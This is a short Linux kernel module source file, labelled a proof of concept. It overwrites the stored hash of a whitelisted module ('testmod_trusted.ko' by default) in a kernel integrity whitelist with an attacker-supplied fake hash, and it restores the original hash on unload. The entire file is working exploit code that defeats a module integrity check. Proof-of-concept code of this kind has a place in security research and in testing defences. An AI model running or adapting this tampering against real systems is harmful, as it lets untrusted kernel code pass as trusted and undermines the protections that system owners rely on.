// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_fake_hash"
#define POC_DESC "inte poc overwrite whitelist hash"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);

static unsigned char saved_hash[32];
static unsigned char *target_hash;

static int __init poc_init(void)
{
	unsigned char fake[32];
	const char *name = poc_target_name ? poc_target_name : "testmod_trusted.ko";
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (!poc_find_hash || !poc_fake_hash)
		return -EINVAL;
	if (poc_hex_to_bytes(poc_fake_hash, fake, sizeof(fake)))
		return -EINVAL;
	target_hash = poc_call_find_hash((void *)poc_find_hash, name);
	if (!target_hash) {
		poc_err("whitelist node not found");
		return -ENOENT;
	}
	memcpy(saved_hash, target_hash, sizeof(saved_hash));
	memcpy(target_hash, fake, sizeof(fake));
	poc_info("hash %02x%02x%02x%02x -> %02x%02x%02x%02x",
		 saved_hash[0], saved_hash[1], saved_hash[2], saved_hash[3],
		 target_hash[0], target_hash[1], target_hash[2], target_hash[3]);
	return 0;
}

static void __exit poc_exit(void)
{
	if (target_hash)
		memcpy(target_hash, saved_hash, sizeof(saved_hash));
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
